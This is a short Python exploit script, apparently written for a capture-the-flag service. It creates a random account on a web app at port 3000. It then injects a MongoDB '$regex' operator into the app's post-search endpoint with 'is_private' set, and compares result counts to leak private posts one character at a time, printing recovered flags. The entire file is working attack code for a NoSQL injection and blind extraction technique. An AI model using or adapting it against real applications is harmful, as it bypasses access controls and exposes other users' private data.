#!/usr/bin/env python

import sys
import random
from string import ascii_letters, ascii_uppercase, digits
import requests as rq


def random_string():
    return ''.join(random.choice(ascii_letters) for _ in range(32))


host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
url = f'http://{host}:3000'


def check_regexp(regexp: str) -> int:
    payload = {'text': {'$regex': regexp}, 'is_private': True}
    r = s.get(f'{url}/search_posts', json=payload)
    posts = r.json().get('posts')
    if posts is None:
        return 0
    return len(posts)


s = rq.Session()
creds = random_string()
s.post(f'{url}/auth/create', json={'username': creds, 'password': creds})
s.headers['Authorization'] = f'Basic {creds}:{creds}'

flag_alpha = ascii_uppercase + digits + '='
prefixes = {''}
while len(prefixes) > 0:
    flag_prefix = max(prefixes)
    prefixes.remove(flag_prefix)

    flag_regexp = [flag_prefix] + ['[A-Z0-9]'] * (31 - len(flag_prefix)) + ['=']
    flag_regexp[1] = '='
    base_count = check_regexp(''.join(flag_regexp))

    for letter in flag_alpha:
        flag_regexp[1] = letter
        if check_regexp(''.join(flag_regexp)) > base_count:
            new_prefix = flag_prefix + letter
            if len(new_prefix) == 31:
                print(new_prefix + '=', end=' ', flush=True)
            else:
                prefixes.add(new_prefix)
                print(new_prefix, end=' ', flush=True)

